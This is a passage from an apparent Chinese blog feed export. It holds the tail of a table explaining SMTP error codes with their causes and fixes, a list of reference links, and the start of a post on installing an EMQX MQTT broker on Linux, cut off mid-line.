由于邮件服务器上的设定错误造成您无法寄送信件，请联络您的网络管理员</td></tr><tr><td>当出现这三种错误讯息时，寄件端邮件服务器已经被置入收信者的黑名单之中或是收信端信箱不存在。</td><td>请联络收信者确认邮件地址或是请收信者联络邮递员将寄信者或是寄信端邮件服务器从黑名单中剔除。</td><td></td></tr><tr><td>530 5.7.0</td><td>Must Issue a Starttls Command First</td><td>在开始寄信前，必须下一个STARTTLS的指令</td></tr><tr><td>这错误讯息是您使用GMAIL时，若是没有输入身份验证的话，也有类似530 Authentication is required的错误讯息。</td><td>请寄信者输入认证数据。</td><td></td></tr><tr><td>535</td><td>1. Error: Authentication Failed 2. Authentication Unsuccessful</td><td>1. 错误讯息：验证失败 2. 验证不成功</td></tr><tr><td>寄信端邮件服务器为了要防止垃圾信做出传递邮件的限制。</td><td>可请邮递员设定SMTP AUTH的认证或是限定某个IP地址才可寄信的方式。</td><td></td></tr><tr><td>541</td><td>1. No Answer From Host 2. Recipient Address Rejected - Access Denied (typically By the Recipient’s Antispam Program / Appliance</td><td>1. 收信者端没有回应 2. 收信者端拒绝收信（通常是收信者端的反垃圾信程序造成的问题）</td></tr><tr><td>1. 收件者主机无响应 2. 收件者地址被拒</td><td>请收信者通知网络管理者将寄信者加入白名单</td><td></td></tr><tr><td>544</td><td>Recipient Address Rejected: Relay Access Denied</td><td>收信者邮件信箱被拒绝：传递邮件遭拒</td></tr><tr><td>寄信端邮件服务器为了要防止垃圾信做出传递邮件的限制</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能 设定 SMTP AUTH 的认证通过后再寄信，或是限定某个IP地址才可寄信的方式。</td><td></td></tr><tr><td>550</td><td>Unable To Relay For …</td><td>此信件无法传递</td></tr><tr><td>DNS指向设定错误造成无法解析收信端邮件服务器。</td><td>请邮递员检测DNS是否正常。</td><td></td></tr><tr><td>550</td><td>Mailbox (<a href="mailto:&#x78;&#x78;&#120;&#64;&#120;&#120;&#120;&#46;&#120;&#120;">&#x78;&#x78;&#120;&#64;&#120;&#120;&#120;&#46;&#120;&#120;</a>) Not Found Or Inactivated</td><td>信箱不存在或没被启用</td></tr><tr><td>信箱不存在或没被启用。</td><td>检查账号信箱是否已被删除或尚未启用</td><td></td></tr><tr><td>550</td><td>…relaying Denied</td><td>电子邮件传递遭到拒绝</td></tr><tr><td>寄信端邮件账号或是IP地址可能被收信端邮件服务器放入黑名单中。</td><td>请与收信者通知邮递员将寄信者的IP地址或是寄信端邮件服务器IP地址从黑名单移除。</td><td></td></tr><tr><td>550</td><td>1. Requested Actions Not Taken As the Mailbox Is Unavailable 2. Not Our Customer 3. Invalid Recipient 4. No Such User Here 5. <a href="mailto:&#66;&#97;&#x72;&#97;&#x63;&#x6b;&#46;&#111;&#x62;&#x61;&#x6d;&#x61;&#64;&#116;&#x68;&#x69;&#x73;&#x63;&#x6f;&#109;&#112;&#x61;&#110;&#121;&#x2e;&#x63;&#x6f;&#x6d;">&#66;&#97;&#x72;&#97;&#x63;&#x6b;&#46;&#111;&#x62;&#x61;&#x6d;&#x61;&#64;&#116;&#x68;&#x69;&#x73;&#x63;&#x6f;&#109;&#112;&#x61;&#110;&#121;&#x2e;&#x63;&#x6f;&#x6d;</a>, This Thiscompany.com Mailbox Does Not Exist – Giving Up 6. Account Not Available 7. Address Rejected 8. User Account Is Unavailable</td><td>1. 所要求动作无法执行，信箱不存在 2. 不是我们的客户 3. 无效的收信者账号 4. 这里没有这个账号 5. THISCOMPANY.COM 这个账号不存在，放弃吧！ 6. 无此账号 7. 邮件地址被拒 8. 无此用户账号</td></tr><tr><td>收件端邮件账号不存在、停用或被删除。</td><td>发件人需向收信者确认正确的邮件地址</td><td></td></tr><tr><td>550</td><td>1. 550 Verification Failed For <a href="mailto:&#x58;&#x78;&#120;&#64;&#x78;&#x78;&#x78;&#x2e;&#120;&#x78;&#120;">&#x58;&#x78;&#120;&#64;&#x78;&#x78;&#x78;&#x2e;&#120;&#x78;&#120;</a> 2. Previous (cached) Callout Verification Failure 3. Sender Verify Failed</td><td>1. 此账号 <a href="mailto:&#x78;&#x78;&#120;&#x40;&#x78;&#120;&#x78;&#x2e;&#120;&#x78;&#120;">&#x78;&#x78;&#120;&#x40;&#x78;&#120;&#x78;&#x2e;&#120;&#x78;&#120;</a> 的身份核对失败 2. 前次存在快取里的身份核对失败 3. 寄信者的身份核对失败</td></tr><tr><td>通常意指寄信者已经被反垃圾信机制或是防火墙列入黑名单</td><td>请收信者向邮递员反映，并把寄信者白名单化，并检查 spf 设定</td><td></td></tr><tr><td>550</td><td>Cyberoam Anti Spam Engine Has Identified This Email As a Spam. Refid:str=0001.0a0b0206.4ba7422c.01f5,ss=1,vtr=str,vl=0,pt =</td><td>反垃圾信机制侦测并怀疑此信件为垃圾信</td></tr><tr><td>通常发生在寄信端的防火墙或反垃圾信机制怀疑此封邮件可能是垃圾信因此阻挡下来。以防止垃圾信件流传到收件者端。</td><td>请网络管理者对此信件放行。</td><td></td></tr><tr><td>550</td><td>Recipients’ Mailbox Not Local And Mail Relay Is Not Enabled</td><td>收信者的邮件信箱非本地信箱且无法做邮件转寄的动作</td></tr><tr><td>寄信端邮件信箱和收信端邮件信箱不在同一网域内，无法寄信。</td><td>寄信者请与网络管理员联系作适当的调整</td><td></td></tr><tr><td>550</td><td>The Sending Address Is Invalid</td><td>寄信者的邮件地址无效</td></tr><tr><td>寄信端邮件服务器的MX记录设定有误造成收件端的DNS系统无法解析寄件端的邮件地址，</td><td>寄信者通知邮递员做检测并做修正。</td><td></td></tr><tr><td>550</td><td>Recipients Outside of Your Domain Where This Is Not Allowed</td><td>寄信者邮件信箱和收信者邮件信箱不在同一网域内，无法寄信</td></tr><tr><td>寄信者邮件信箱和收件者邮件信箱不在同一网域内，无法寄信。</td><td>寄信者请与邮递员联系作适当的调整。</td><td></td></tr><tr><td>550</td><td>Smtp Authentication Required</td><td>需要做SMTP身份认证来进行寄信的动作</td></tr><tr><td>在Outlook或是Outlook Express里，SMTP AUTH若没有设定好，会出现此项错误讯息。</td><td>在账号设定的「服务器」中点选「SMTP服务器需要认证」。</td><td></td></tr><tr><td>550</td><td>The Recipient’s Server Is Down</td><td>收信者的邮件服务器停机中</td></tr><tr><td>收信端邮件服务器停机中。</td><td>请收信者与网络管理员联络看看邮件服务器何时能够上线。</td><td></td></tr><tr><td>550</td><td>Change To Part of the Email Address To Achieve a Successful Delivery</td><td>信件中的To必须改为正确的邮件账号</td></tr><tr><td>有些公司已经改了自身的域名，因此要求发件人更正收信端邮件账号中的网域名部分。</td><td>在邮件中更正邮件账号中的网域名之后重新寄送一次。</td><td></td></tr><tr><td>550</td><td>[suspend]mailbox Currently Suspended - Please Contact Correspondent Directly</td><td>邮件信箱目前被停权，请自行与收信者用其他方式联络</td></tr><tr><td>收信端邮件信箱目前被停权。</td><td>请寄信者与收信者用其他方式取得联络</td><td></td></tr><tr><td>550</td><td>Incorrect From Address</td><td>邮件中From的邮件地址不正确</td></tr><tr><td>有些ISP禁止寄信者使用非自家维护的域名来寄信。</td><td>请与ISP做沟通协调或是换一家ISP。</td><td></td></tr><tr><td>550</td><td>Mailbox Temporarily Disabled</td><td>邮件信箱暂时被停用</td></tr><tr><td>收信端邮件信箱可能已满尚未整理或是收信者尚未缴纳费用。</td><td>请与收信者使用其他方式联系</td><td></td></tr><tr><td>550</td><td>1. Unrouteable Address</td><td>1. 无效的邮件地址</td></tr><tr><td>收信端的DNS服务器无法解析收信者网域</td><td>检查收件者邮件地址是否正确</td><td></td></tr><tr><td>550</td><td>Mailbox Is Inactive</td><td>邮件信箱尚未开通</td></tr><tr><td>收信端邮件账号尚未开通。</td><td>寄信者应通知收信者其邮件信箱尚未开通，并请ISP将信箱账号开通以供使用。</td><td></td></tr><tr><td>550</td><td>Relay Not Permitted</td><td>禁止转寄</td></tr><tr><td>收件方邮件服务器未正确设定管理之网域</td><td>通知对方系统管理者</td><td></td></tr><tr><td>550</td><td>The Smtp Service To Send As Other Account Parties Is Not Valid For Your Account</td><td>您的邮件账户设定不允许以他人名义发信</td></tr><tr><td>发出信件的发件人账户与使用的 SMTP 账户不同</td><td>请系统管理者更改此设定或发件人账户与SMTP账户以相同账户发信</td><td></td></tr><tr><td>550 5.1.2</td><td>Host Unknown – Host Cannot Be Found</td><td>不明的主机 - 找不到收信者的邮件服务器主机</td></tr><tr><td>DNS指向设定错误造成无法解析收信者端邮件服务器。</td><td>请邮递员检测DNS是否正常。</td><td></td></tr><tr><td>550 5.1.3</td><td>Storedrv.submit; Invalid Recipient Address</td><td>无效的收信者邮件地址</td></tr><tr><td>此错误讯息为MS Exchange Server 2007特有。</td><td>提醒使用者检查收信者的邮件地址是否符合语法规则</td><td></td></tr><tr><td>550 5.4.1</td><td>1. Recipient Address Rejected - Access Denied 2. Internet Security Systems’ Proventia? Intrusion Prevention Appliance Blocked Forwarding of Message</td><td>1. 收信者端拒绝收信 2. 因特网安全系统的入侵防止机制阻挡了邮件</td></tr><tr><td>寄信端IP地址或是寄信端邮件服务器IP地址被列入黑名单中。</td><td>请通知收信端邮件管理者将寄信端邮件账号加入白名单。</td><td></td></tr><tr><td>550 5.7.1</td><td>1. Unable To Relay For 2. Mail From Ip Address Refused By Blackhole Site Dialups.mail-abuse.org 3. Relaying Prohibited</td><td>1. 寄信者的信件无法传递 2. 寄信者的IP地址已被锁定为黑名单 3. 禁止传送此信件</td></tr><tr><td>当遇到这类讯息时，表示收信端邮件服务器将寄信端账号或是寄信端的网域名放入黑名单中。</td><td>请与收信者端邮递员做沟通，加以漂白。</td><td></td></tr><tr><td>550 5.7.1</td><td>Our System Has Detected an Unusual Rate of Unsolicited Mail Originating From Your Ip Address. To Protect Our Users From Spam, Mail Sent From Your Ip Address Has Been Blocked. Please Visit Http://<a href="http://www.google.com/mail/help/bulk_mail.html">www.google.com/mail/help/bulk_mail.html</a> To Review Our Bulk Email Senders Guidelines</td><td>Google: 因发现不当的大量邮件来自你的 IP 地址，你的 IP 地址已被禁止寄入 GMAIL</td></tr><tr><td>发送大量邮件至 Gmail</td><td>依照大量邮件发送规范，重新检视你的电子邮件是否有不当之处． <a href="http://www.google.com/mail/help/bulk_mail.html">http://www.google.com/mail/help/bulk_mail.html</a></td><td></td></tr><tr><td>551</td><td>1. User Not Local Or Invalid Address –relay Denied 2. Delivery Not Allowed To Non-local Recipient</td><td>1. 邮件服务器知道使用者不属于本地端拒绝做传递信的服务 2. 对于非本地的使用者不提供邮件传递的服务</td></tr><tr><td>有些ISP为了要抵挡垃圾信乱飞的现象，他们索性对其他网域的使用者不提供传递信件的服务。</td><td>1. 解决方式是打电话给这些ISP证明发件人非垃圾信制造者。 2. 换一家ISP。</td><td></td></tr><tr><td>552</td><td>Requested Mail Action Aborted: Exceeded Storage Allocation</td><td>所要求的动作中断：超出所分配的储存空间，邮件将退回给发件人</td></tr><tr><td>收信端邮件信箱容量已达上限</td><td>建议发件人通知收信者将信件清理一番</td><td></td></tr><tr><td>552</td><td>Size of the Incoming Message Exceeds the Incoming Size Limit</td><td>新进信件的大小超过单笔新进信件的上限</td></tr><tr><td>新进信件的大小超过单笔新进信件的上限。</td><td>将欲寄信件分多笔寄出。2. 收信者与邮递员联络并将上限值做一个调整。</td><td></td></tr><tr><td>552</td><td>Too Many Recipients</td><td>单封邮件中的收信者太多</td></tr><tr><td>单封邮件中的收信者太多。</td><td>建议分多笔邮件寄出。</td><td></td></tr><tr><td>552</td><td>Too Much Mail Data</td><td>单封邮件中数据量过大</td></tr><tr><td>单封邮件中数据量过大。</td><td>建议将数据分散在多笔邮件中寄出。</td><td></td></tr><tr><td>552</td><td>Request Mail Action Aborted: Your are Not Allowed To Use Maillist Account</td><td>所要求的邮件动作中断 - 不能用maillist的账号</td></tr><tr><td>寄信者没有使用大量寄信功能的权限。</td><td>请与邮递员确认权限。</td><td></td></tr><tr><td>552</td><td>Sorry, We Don’t Allow Mail From Your Host</td><td>寄信者所在主机不被允许寄信</td></tr><tr><td>寄信者所在主机不被允许寄信。</td><td>检查寄信端邮件账号是否被放进拒绝名单中。</td><td></td></tr><tr><td>552</td><td>Requested Mail Action Aborted:too Many Recipients, Limited Is 150</td><td>收信者数量超过限制的150位</td></tr><tr><td>单封邮件的收信者数量超过上限。</td><td>1. 降低一次收信端邮件账号的数量。 2. 分批寄信。</td><td></td></tr><tr><td>552 5.1.1</td><td>Sorry, Mailbox <a href="mailto:&#65;&#x6c;&#x61;&#x6e;&#64;&#x74;&#x68;&#105;&#115;&#x63;&#111;&#109;&#112;&#97;&#x6e;&#121;&#46;&#99;&#111;&#109;">&#65;&#x6c;&#x61;&#x6e;&#64;&#x74;&#x68;&#105;&#115;&#x63;&#111;&#109;&#112;&#97;&#x6e;&#121;&#46;&#99;&#111;&#109;</a> Is Over Quota Temporarily</td><td>很抱歉，<a href="mailto:&#65;&#x6c;&#x61;&#110;&#64;&#x54;&#x68;&#x69;&#115;&#x43;&#x6f;&#x6d;&#112;&#97;&#x6e;&#121;&#x2e;&#99;&#x6f;&#x6d;">&#65;&#x6c;&#x61;&#110;&#64;&#x54;&#x68;&#x69;&#115;&#x43;&#x6f;&#x6d;&#112;&#97;&#x6e;&#121;&#x2e;&#99;&#x6f;&#x6d;</a>这个信箱容量暂时超过上限</td></tr><tr><td>收信端邮件账号信箱容量暂时超过上限。</td><td>可通知收件者清理邮件信箱腾出空间来收信。</td><td></td></tr><tr><td>552 5.2.3</td><td>1. Data Size Exceeds Maximum Permitted 2. Message Exceeds Maximum Fixed Size</td><td>1. 数据大小超出允许的最大值 2. 邮件超出预设的最大值</td></tr><tr><td>单笔邮件数据大小还有信件大小超出允许的最大值。</td><td>1.请缩小单笔邮件的大小，可将一封邮件切为多封邮件来传送 。 2.请收信端通邮递员将收信上限提高。 3. 若是还是无法寄送，可以考虑使用FTP的传输方式来传送</td><td></td></tr><tr><td>552 5.3.4</td><td>Error: Message File Too Big</td><td>电子邮件讯息太大</td></tr><tr><td>寄出的邮件可能包含过大的附件文件</td><td>请缩小附件文件大小再试一次</td><td></td></tr><tr><td>553</td><td>1. Requested Action Not Taken: Mailbox Name Not Allowed [e.g. Mailbox Syntax Incorrect] 2. There Is an Invalid Email Address in the To, Cc Or Bcc Field of the Email Message 3.</td><td>1. 信件里的TO， CC， BCC有无效的收信者信箱地址 2. 不明的邮件地址，放弃传递</td></tr><tr><td>因收信端邮件账号无效或错误出现此讯息</td><td>请确认每一个收信端邮件账号都是有效的</td><td></td></tr><tr><td>553</td><td>Sorry, Relaying Denied From Your Location</td><td>抱歉，无法从寄信者的所在地或是因特网联机发送信件</td></tr><tr><td>有些ISP为了要抵挡垃圾信乱飞的现象，他们索性对其他网域的使用者不提供传递信件的服务。</td><td>1. 解决方式是打电话给这些ISP证明发件人非垃圾信制造者。 2. 换一家ISP。</td><td></td></tr><tr><td>553</td><td>1. Relay Restriction 2. From &lt;&gt; Message Blocked 3. Sorry, You are Not Allow To Use This Smtp To Relay Your Email 4. Sorry, That Domain Isn’t in My List of Allowed Rcpt Hosts</td><td>1. 传送邮件是受到限制 2. 由发件人的身份寄信时遭到拒绝 3. 抱歉，发件人无法使用这个SMTP服务器来传递邮件 4. 抱歉，此网域不在SMTP服务器的允许寄送名单中</td></tr><tr><td>在寄送信件之前必须先经过身份认证</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能</td><td></td></tr><tr><td>553</td><td>Authentication Is Required To Send Mail As</td><td>在寄送信件之前必须先经过身份认证</td></tr><tr><td>在Outlook或是Outlook Express里使用，若没有设定我的服务器需要验证，会出现此项错误讯息</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能</td><td></td></tr><tr><td>553</td><td>Mailbox Name Not Allowed</td><td>收件人邮箱地址不合语法</td></tr><tr><td>收信端邮件账号不合语法</td><td>需检查收信端邮件账号是否正确</td><td></td></tr><tr><td>553</td><td>Sorry, Your Envelop Sender Is in My Bad Mail From List</td><td>抱歉，寄信者电子邮件地址(邮件内)在黑名单中</td></tr><tr><td>收信端邮件服务器限制了寄信端电子邮件地址</td><td>1. 通知收信端邮递员将之放行 2. 更改邮件的发件人电子邮件地址</td><td></td></tr><tr><td>553</td><td>Specified Domain Is Not Allowed</td><td>收信端邮件服务器拒收来自特定网域的信件</td></tr><tr><td>收信端邮件服务器拒收来自特定网域的信件</td><td>请通知收信端邮递员将发件人所属网域名从黑名单中剔除</td><td></td></tr><tr><td>553 5.1.3</td><td>User Address Required!</td><td>需要输入邮件账号</td></tr><tr><td>信件中收信端邮件账号错误</td><td>请确认收信端邮件账号输入无误</td><td></td></tr><tr><td>553 5.1.3</td><td>Invalid Local Part</td><td>电子邮件收件者帐户部分错误</td></tr><tr><td>可能使用了有 BUG 的邮件软件如 Outlook Express 导致寄出 这样的邮件</td><td>重设通讯簿，尝试将问题信箱设定一个全名，或更换更好的邮件软件</td><td></td></tr><tr><td>553 5.1.8</td><td>Domain of Sender Address Does Not Exist</td><td>发信者的网域不存在</td></tr><tr><td>1. 寄信端的DNS服务器故障 2. 收信端的DNS服务器故障 3. 发件人信箱网域部分打错字</td><td>检查邮件软件内设定的发件人电子邮件地址网域部分是否打错字</td><td></td></tr><tr><td>554</td><td>1. Transaction Failed 2. Delivery Error: This User Doesn’t Have a Yahoo.com Account 3. Sorry Your Message ToCannot Be Delivered. This Account Has Been Disabled Or Discontinued</td><td>1. 传输失败 2. 收件者没有雅虎的邮件账号 3. 收件者的账号可能被停用或是收件者已经不在使用此邮件账号</td></tr><tr><td>1. 收信端邮件账号错误</td><td>1. 请检查收信端网域名 2. 是否拼错字 3. 请检查收信端邮件账号是否存在或是被停用</td><td></td></tr><tr><td>554</td><td>1. Smtp Relay Service Does Not Allow Your Ip Address To Relay Mail To <a href="mailto:&#88;&#x78;&#120;&#64;&#x78;&#x78;&#120;&#x2e;&#120;&#120;&#120;">&#88;&#x78;&#120;&#64;&#x78;&#x78;&#120;&#x2e;&#120;&#120;&#120;</a> 2. Smtp Service Does Not Allow Your Ip Address 3. Client Host Rejected: Access Denied</td><td>1. SMTP寄信服务不允许寄信者的IP地址传递信件给 <a href="mailto:&#x78;&#x78;&#x78;&#x40;&#120;&#x78;&#120;&#46;&#x78;&#x78;&#120;">&#x78;&#x78;&#x78;&#x40;&#120;&#x78;&#120;&#46;&#x78;&#x78;&#120;</a> 2. SMTP寄信服务不允许寄信者的IP地址传递信件 3. 客户端被拒绝登入：存取拒绝</td></tr><tr><td>寄信端邮件服务器为杜绝计算机病毒以及被当作垃圾信跳板，使用者必须经过 SMTP Auth 的身份认证才能寄信</td><td>1. 请在Outlook里的「我的服务器需要验证」打勾来启动 SMTP Auth 的功能 2. 强烈建议任何寄信者需经过 SMTP Auth 的身份认证，若需要 Open Relay 则需要手动加入寄信者的IP地址</td><td></td></tr><tr><td>554</td><td>1. (x.x.x.x) Was Found On One Or More Dnsbls, See Http://help.comcast.net/content/faq/bl000010 2. Recipient Address Rejected 3. Service Unavailable; Client Host (x.x.x.x) Blocked Using Barracuda Reputation; Http://recipientdomain.barracudacentral.com/q.cgi?ip= (554 5.7.1) 4. Your Access To This Mail System Has Been Rejected Due To the Sending Mta’s Poor Reputation. If You Believe That This Failure Is in Error, Please Contact the Intended Recipient Via Alternate Means</td><td>1. 发件人的邮件服务器IP地址出现在DNSBLs中，详情请到下列网页察看： <a href="http://help.comcast.net/content/faq/BL000010">http://help.comcast.net/content/faq/BL000010</a> 2. 拒绝收信者邮件地址 3. 寄信者的IP地址为反垃圾信机制所阻挡 4. 由于发件人的邮件服务器有发垃圾信的坏名誉纪录，收信者的邮件服务器拒收</td></tr><tr><td>寄信端IP地址或邮件服务器的IP地址被放入黑名单</td><td>1. 请与收信端邮件服务器管理员联系商讨是否可以将寄件端IP地址解除锁定 2. 请寄信端邮递员或是所属ISP工作人员与RBL相关网站接洽讨论是否能从黑名单中除名</td><td></td></tr><tr><td>554</td><td>Your Ip (x.x.x.x) Is Dynamic Ip Address, Use Your Isp Smtp Server Instead</td><td>您的IP地址视为动态IP地址，请使用您 ISP 的 SMTP 服务器</td></tr><tr><td>收件端邮件服务器不接受动态IP地址上的邮件服务器</td><td>请向您的ISP申请固定IP来架设邮件服务器</td><td></td></tr><tr><td>554</td><td>Your Ip (x.x.x.x) Was Listed in Dsbl - Please Visit Http://dsbl.org/listing?x.x.x.x For More Details</td><td>寄信者的IP地址被收录在DSBL名单中，详情请看 <a href="http://dsbl.org/listing?x.x.x.x">http://dsbl.org/listing?x.x.x.x</a></td></tr><tr><td>请不用担心这个黑名单，因为dsbl.org在2009年初已经下线。</td><td>N/A</td><td></td></tr><tr><td>554 5.3.0</td><td>Mail Server Permanently Rejected Message</td><td>邮件服务器永久地拒绝此邮件</td></tr><tr><td>信件内容可能被对方过滤器阻挡</td><td>请与收件端邮件管理者联系将发件人网域或IP地址加入白名单以跳过过滤机制</td><td></td></tr><tr><td>554 5.7.1</td><td>The File Xxx Has Been Blocked. File Quarantined As:b100493a.xxx</td><td>档案XXX已被隔离放置于隔离区内。文件名为：b100493a.XXX。</td></tr><tr><td>此档案极有可能含计算机病毒。</td><td>请使用防病毒软件扫瞄处理。</td><td></td></tr><tr><td>571</td><td>1. Email Address We Do Not Relay 2. the Following Addresses Had Permanent Delivery Errors: <a href="mailto:&#x58;&#x78;&#120;&#x40;&#x78;&#x78;&#120;&#x2e;&#120;&#x78;&#x78;">&#x58;&#x78;&#120;&#x40;&#x78;&#x78;&#120;&#x2e;&#120;&#x78;&#x78;</a></td><td>1. 我们无法为此收件者传递邮件(不提供转寄) 2. 此收信邮件账号有永久性收件上的问题：<a href="mailto:&#x78;&#120;&#120;&#64;&#120;&#120;&#120;&#46;&#x78;&#x78;&#x78;">&#x78;&#120;&#120;&#64;&#120;&#120;&#120;&#46;&#x78;&#x78;&#x78;</a></td></tr><tr><td>原因一：收件者邮件服务器设定错误，误认自己不代管收件者网域 原因二：寄信者没经过 SMTP Auth (我的外寄服务器(SMTP)需要认证) 的验证寄信模式 原因三：不被允许做寄信的动作 原因四：寄信端邮件服务器在黑名单中</td><td>原因一：收件者邮件服务器设定错误，误认自己不代管收件者网域 原因二：寄信者没经过 SMTP Auth (我的外寄服务器(SMTP)需要认证) 的验证寄信模式 原因三：不被允许做寄信的动作 原因四：寄信端邮件服务器在黑名单中</td><td></td></tr></tbody></table><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/chenfei_5201213/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">10138969</span> -所有错误码<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/kerry0071/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">28604267</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task -介绍+常见错误码<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yd1227/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">01</span><span class="hljs-regexp">/19/</span><span class="hljs-number">1939096</span>.html 注入<br><br>https:<span class="hljs-regexp">//</span>www.sqlsec.com<span class="hljs-regexp">/2017/</span><span class="hljs-number">08</span>/smtp.html  -案例<br><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">3228</span>edf53c42 -案例<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/fageweiketang/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">94394885</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task -案例<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/tpnndhqc/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">51240678</span> -详细的命令<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/kerry0071/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">28604267</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task -SMTP介绍<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_35644234/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">68961603</span> -SMTP介绍<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/gruhgd/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">86701742</span>  -SASL - 简单认证和安全层<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/ly_6118/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">89637270</span> -linux下smtp服务器搭建(安全配置)<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_42746624/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81129935</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task<br>-linux下smtp服务器搭建(安全配置)<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/flytor/</span>p/<span class="hljs-number">11448035</span>.html   --Linux中Postfix邮件认证配置<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/my98800/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">78592492</span>  -IMAP SMTP POP3区别<br><br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/skythesea/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79825197</span>   -邮件服务器添加SPF、DKIM、DMARC、PTR<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/rain99/</span>articles/<span class="hljs-number">10418798</span>.html --smtp服务器认证状态与不认证状态<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mail-safe/</span>p/<span class="hljs-number">10620938</span>.html  --邮件安全之邮件加密初探<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>POP3</tag>
      
      <tag>SMTP</tag>
      
      <tag>IMAP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux搭建mqtt环境</title>
    <link href="/2021/08/22/Linux%E6%90%AD%E5%BB%BAMQTT/"/>
    <url>/2021/08/22/Linux%E6%90%AD%E5%BB%BAMQTT/</url>
    
    <content type="html"><![CDATA[<h2 id="选择Broker"><a href="#选择Broker" class="headerlink" title="选择Broker"></a>选择Broker</h2><p>目前主流的Broker有以下3个：</p><ul><li><p> <a href="https://mosquitto.org/">Mosquitto</a>  ，下载地址：<code>http://mosquitto.org/files/binary/</code></p></li><li><p><a href="https://vernemq.com/">VerneMQ</a></p></li><li><p><a href="http://emqtt.io/">EMQTT</a></p></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>EMQTT</code>搭建mqtt环境</p><h3 id="1-下载对应版本的安装包"><a href="#1-下载对应版本的安装包" class="headerlink" title="1. 下载对应版本的安装包"></a>1. 下载对应版本的安装包</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.emqx.io/downloads<span class="hljs-comment">#broker</span><br></code></pre></td></tr></table></figure><h3 id="2-解压并运行"><a href="#2-解压并运行" class="headerlink" title="2. 解压并运行"></a>2. 解压并运行</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">emqx <span class="hljs-built_in">console</span><br></code></pre></td></tr></table></figure><h3 id="3-访问web监控平台"><a href="#3-访问web监控平台" class="headerlink" title="3.访问web监控平台"></a>3.访问web监控平台</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.2</span>:<span class="hljs-number">18083</span>/<br></code></pre></td></tr></table></figure><h3 id="4-本地连接测试"><a href="#4-本地连接测试" class="headerlink" title="4. 本地连接测试"></a>4. 本地连接测试</h3><h4 id="4-1-连接工具下载"><a href="#4-1-连接工具下载" class="headerlink" title="4.1 连接工具下载"></a>4.1 连接工具下载</h4><p>​    win7 64位系统，选择 org.eclipse.paho.ui.app-1.0.2-win32.win32.x86_64.zip</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span 